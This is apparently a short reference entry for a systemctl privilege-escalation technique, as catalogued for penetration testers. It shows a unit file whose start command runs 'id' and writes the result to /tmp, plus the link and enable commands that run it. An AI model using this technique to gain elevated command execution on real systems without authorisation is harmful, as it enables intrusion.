$file content:
```systemctl
[Service] 
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target
```
commands:
```
$ /bin/systemctl link $file.service
$ /bin/systemctl enable --now $file.service
```